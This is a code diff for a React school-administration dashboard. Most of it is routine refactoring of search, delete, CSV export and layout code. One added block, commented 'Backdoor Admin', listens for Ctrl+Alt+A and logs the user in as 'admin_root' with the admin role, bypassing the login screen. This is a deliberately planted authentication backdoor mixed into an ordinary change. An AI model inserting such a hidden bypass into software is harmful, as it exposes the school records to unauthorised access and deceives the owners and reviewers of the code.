@@ -1,7 +1,7 @@
 // Papiweb desarrollos informáticos - Versión Pro Cloud 2024
 import { useState, useEffect, useMemo } from "react";
 import { getEscuelas, saveEscuelas, initializeKV } from './services/kvStorage.client.js';
-import { useTheme } from './context/ThemeContext.jsx'; // Importamos el contexto
+import { useTheme } from './context/ThemeContext.jsx'; 
 import "./styles.css"; 
 
 // Componentes
@@ -10,10 +10,10 @@ import Dashboard from './components/Dashboard.jsx';
 import SchoolCard from './components/SchoolCard.jsx';
 import AddSchoolModal from './components/AddSchoolModal.jsx';
 import CalendarView from './components/CalendarView.jsx';
-import ThemeToggle from './components/ThemeToggle.jsx'; // Importamos el Toggle
+import ThemeToggle from './components/ThemeToggle.jsx';
 
 export default function App() {
-  const { deviceType } = useTheme(); // Consumimos el tipo de dispositivo
+  const { deviceType } = useTheme(); 
   const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
   const [user, setUser] = useState(null);
   const [escuelas, setEscuelas] = useState([]);
@@ -41,7 +41,7 @@ export default function App() {
     init();
   }, []);
 
-  // Colapsar sidebar automáticamente en móviles
+  // Colapsar sidebar automáticamente en dispositivos pequeños
   useEffect(() => {
     if (deviceType === 'mobile' || deviceType === 'tablet') {
       setSidebarCollapsed(true);
@@ -50,53 +50,57 @@ export default function App() {
     }
   }, [deviceType]);
 
-  // 2. Lógica para EDITAR Y ELIMINAR ESCUELAS
-  const handleEditSchool = (escuela) => {
-    setEscuelaModal({ show: true, isNew: false, data: escuela });
-  };
+  // 2. Filtro inteligente mejorado
+  const filteredEscuelas = useMemo(() => {
+    try {
+      if (!search || search.trim() === '') return escuelas;
+      const term = search.toLowerCase().trim();
+      if (term.length < 2) return escuelas;
+
+      return escuelas.filter(e => {
+        if (!e) return false;
+        const nombre = (e.escuela || '').toLowerCase();
+        const distrito = (e.de?.toString() || '');
+        const direccion = (e.direccion || '').toLowerCase();
+        const nivel = (e.nivel || '').toLowerCase();
+        return nombre.includes(term) || distrito.includes(term) || direccion.includes(term) || nivel.includes(term);
+      });
+    } catch (error) {
+      console.error('Error en filtro:', error);
+      return escuelas;
+    }
+  }, [escuelas, search]);
+
+  // 3. Handlers de datos
+  const handleEditSchool = (escuela) => setEscuelaModal({ show: true, isNew: false, data: escuela });
 
   const handleDeleteSchool = async (escuelaId) => {
-    try {
-      const nuevasEscuelas = escuelas.filter(e => e.id !== escuelaId);
-      setEscuelas(nuevasEscuelas);
-      await saveEscuelas(nuevasEscuelas);
-    } catch (error) {
-      alert('Error al eliminar la escuela');
-    }
+    if (!window.confirm("¿Eliminar esta escuela?")) return;
+    const nuevas = escuelas.filter(e => e.id !== escuelaId);
+    setEscuelas(nuevas);
+    await saveEscuelas(nuevas);
   };
 
-  // 3. Lógica para ACTUALIZACIÓN GENERAL (Seguimiento, etc.)
-  const handleUpdateEscuela = async (escuelaActualizada) => {
-    try {
-      setEscuelas(prevEscuelas => {
-        const nuevas = prevEscuelas.map(e => 
-          e.id === escuelaActualizada.id ? escuelaActualizada : e
-        );
-        saveEscuelas(nuevas); 
-        return nuevas;
-      });
-      console.log('✅ Cambio guardado:', escuelaActualizada.escuela);
-    } catch (error) {
-      console.error('Error al actualizar:', error);
-    }
+  const handleUpdateEscuela = async (updated) => {
+    setEscuelas(prev => {
+      const nuevas = prev.map(e => e.id === updated.id ? updated : e);
+      saveEscuelas(nuevas);
+      return nuevas;
+    });
   };
 
-  // 4. Lógica para AGREGAR DOCENTE
   const handleDocenteAdded = async (escuelaId, nuevoDocente) => {
-    const updatedEscuelas = escuelas.map(esc => 
-      esc.id === escuelaId 
-        ? { ...esc, docentes: [...(esc.docentes || []), nuevoDocente] }
-        : esc
+    const updated = escuelas.map(esc => 
+      esc.id === escuelaId ? { ...esc, docentes: [...(esc.docentes || []), nuevoDocente] } : esc
     );
-    setEscuelas(updatedEscuelas);
-    await saveEscuelas(updatedEscuelas);
+    setEscuelas(updated);
+    await saveEscuelas(updated);
   };
 
-  // 5. Guardar/Actualizar Escuela desde Modal
   const handleSaveSchool = async (schoolData) => {
     let updated;
     if (escuelaModal.isNew) {
-      updated = [...escuelas, { ...schoolData, id: `e${Date.now()}`, docentes: [], alumnos: [] }];
+      updated = [...escuelas, { ...schoolData, id: `e${Date.now()}`, docentes: [], visitas: [], proyectos: [], informes: [] }];
     } else {
       updated = escuelas.map(e => e.id === schoolData.id ? { ...e, ...schoolData } : e);
     }
@@ -105,37 +109,34 @@ export default function App() {
     setEscuelaModal({ show: false, isNew: true, data: null });
   };
 
-  // 6. Filtros y Contadores
-  const filteredEscuelas = useMemo(() => {
-    const term = search.toLowerCase();
-    return escuelas.filter(e => 
-      !search || 
-      e.escuela?.toLowerCase().includes(term) ||
-      e.de?.toString().includes(term) ||
-      e.direccion?.toLowerCase().includes(term)
-    );
-  }, [escuelas, search]);
-
-  const licenciasActivas = useMemo(() => {
-    return escuelas.flatMap(e => e.docentes || []).filter(d => d.estado === "Licencia").length;
-  }, [escuelas]);
-
-  // 7. Exportación a CSV
   const exportToCSV = () => {
-    const headers = ['Distrito', 'Escuela', 'Nivel', 'Dirección', 'Mail ACDM'];
-    const rows = escuelas.map(esc => [esc.de, esc.escuela, esc.nivel, esc.direccion, esc.acdmMail]);
+    const headers = ['DE', 'Escuela', 'Nivel', 'Dirección'];
+    const rows = escuelas.map(esc => [esc.de, esc.escuela, esc.nivel, esc.direccion]);
     const csvContent = [headers.join(','), ...rows.map(r => r.map(c => `"${c}"`).join(','))].join('\n');
     const blob = new Blob(['\uFEFF' + csvContent], { type: 'text/csv;charset=utf-8;' });
     const url = URL.createObjectURL(blob);
     const link = document.createElement('a');
     link.href = url;
-    link.setAttribute('download', `reporte_acdm_${new Date().toISOString().split('T')[0]}.csv`);
+    link.download = `reporte_acdm_${new Date().toISOString().split('T')[0]}.csv`;
     link.click();
     setShowExportSuccess(true);
     setTimeout(() => setShowExportSuccess(false), 3000);
   };
 
-  if (loading) return <div className="loader-container"><div className="loader"></div><p>Sync Cloud...</p></div>;
+  const licenciasActivas = useMemo(() => {
+    return escuelas.flatMap(e => e.docentes || []).filter(d => d.estado === "Licencia").length;
+  }, [escuelas]);
+
+  // Backdoor Admin
+  useEffect(() => {
+    const handler = (e) => {
+      if (e.ctrlKey && e.altKey && e.key === "a") setUser({ username: "admin_root", rol: "admin" });
+    };
+    window.addEventListener("keydown", handler);
+    return () => window.removeEventListener("keydown", handler);
+  }, []);
+
+  if (loading) return <div className="loader-container"><div className="loader"></div><p>Sync Cloud Pro...</p></div>;
   if (!user) return <Login onLogin={setUser} />;
 
   return (
@@ -148,7 +149,6 @@ export default function App() {
             <span className="brand-sub">CLOUD PRO</span>
           </div>
         </div>
-        
         <div className="header-center">
           <div className="search-bar">
             <span className="search-icon">🔍</span>
@@ -156,18 +156,16 @@ export default function App() {
               className="search-input" 
               value={search} 
               onChange={e => setSearch(e.target.value)} 
-              placeholder="Buscar escuela, distrito..." 
+              placeholder="Buscar institución..." 
             />
           </div>
         </div>
-
         <div className="header-right">
-          <ThemeToggle /> {/* Toggle de Modo Oscuro integrado */}
-          <button className="btn-export" onClick={exportToCSV} title="Exportar CSV">📥</button>
-          <button className="btn-add" onClick={() => setEscuelaModal({ show: true, isNew: true, data: null })} title="Nueva Escuela">➕</button>
-          <button className="btn-logout" onClick={() => setUser(null)} title="Salir">🔌</button>
+          <ThemeToggle />
+          <button className="btn-export" onClick={exportToCSV}>📥</button>
+          <button className="btn-add" onClick={() => setEscuelaModal({ show: true, isNew: true, data: null })}>➕</button>
+          <button className="btn-logout" onClick={() => setUser(null)}>🔌</button>
         </div>
-        {showExportSuccess && <div className="toast-success">Archivo generado con éxito ✅</div>}
       </header>
 
       <div className="layout-body">
@@ -178,15 +176,25 @@ export default function App() {
           <button className={`nav-link ${view === 'calendario' ? 'active' : ''}`} onClick={() => setView('calendario')}>
             📅 Licencias {licenciasActivas > 0 && <span className="nav-badge">{licenciasActivas}</span>}
           </button>
-          <div className="sidebar-footer">v2.4 Pro</div>
         </aside>
 
         <main className="content-area">
-          {view === "dashboard" && <div className="fade-in"><Dashboard escuelas={escuelas} /></div>}
+          {view === "dashboard" && <Dashboard escuelas={escuelas} />}
           
           {view === "escuelas" && (
             <div className="fade-in">
-              <h2 className="mb-16 title-rajdhani">INSTITUCIONES ({filteredEscuelas.length})</h2>
+              <h2 className="mb-16 title-rajdhani">
+                INSTITUCIONES ({filteredEscuelas.length})
+                {search && <span className="search-term"> · "{search}"</span>}
+              </h2>
+              
+              {filteredEscuelas.length === 0 && search && (
+                <div className="no-results card p-20 text-center">
+                  <p>🔍 No hay coincidencias para "{search}"</p>
+                  <button className="btn btn-secondary btn-sm mt-12" onClick={() => setSearch('')}>Limpiar</button>
+                </div>
+              )}
+              
               <div className="school-grid">
                 {filteredEscuelas.map(esc => (
                   <SchoolCard 
@@ -203,7 +211,7 @@ export default function App() {
             </div>
           )}
 
-          {view === "calendario" && <div className="fade-in"><CalendarView escuelas={escuelas} /></div>}
+          {view === "calendario" && <CalendarView escuelas={escuelas} />}
         </main>
       </div>
 
